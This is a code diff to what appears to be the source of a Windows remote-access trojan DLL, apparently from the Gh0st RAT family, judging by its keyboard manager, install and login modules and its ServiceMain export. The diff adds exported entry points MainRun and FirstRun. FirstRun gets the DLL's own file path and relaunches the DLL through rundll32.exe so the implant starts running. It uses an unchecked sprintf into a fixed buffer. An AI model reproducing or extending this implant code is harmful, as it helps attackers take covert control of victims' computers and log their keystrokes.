@@ -4,6 +4,7 @@
 #include "common/KernelManager.h"
 #include "common/login.h"
 #include "common/install.h"
+#include <stdio.h>
 
 
 
@@ -280,3 +281,35 @@ extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[])
 	}
 	return;
 }
+
+extern "C" __declspec(dllexport) void MainRun(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow)
+{
+	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
+	WaitForSingleObject(hThread, INFINITE);
+}
+
+extern "C" __declspec(dllexport) void FirstRun(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow)
+{
+	char strMyFileName[MAX_PATH], strCmdLine[MAX_PATH];
+	ZeroMemory(strMyFileName, MAX_PATH);
+	ZeroMemory(strCmdLine, MAX_PATH);
+	//得到自身文件名
+	GetModuleFileName(CKeyboardManager::g_hInstance, strMyFileName, MAX_PATH);
+	//构造启动参数
+	sprintf(strCmdLine, "%s %s,MainRun", "rundll32.exe", strMyFileName);
+
+	//启动服务端
+	STARTUPINFO StartInfo;
+	PROCESS_INFORMATION ProcessInformation;
+	StartInfo.cb = sizeof(STARTUPINFO);
+	StartInfo.lpDesktop = NULL;
+	StartInfo.lpReserved = NULL;
+	StartInfo.lpTitle = NULL;
+	StartInfo.dwFlags = STARTF_USESHOWWINDOW;
+	StartInfo.cbReserved2 = 0;
+	StartInfo.lpReserved2 = NULL;
+	StartInfo.wShowWindow = SW_SHOWNORMAL;
+	BOOL bReturn = CreateProcess(NULL, strCmdLine, NULL, NULL, FALSE, NULL, NULL, NULL, &StartInfo, &ProcessInformation);
+
+}
+
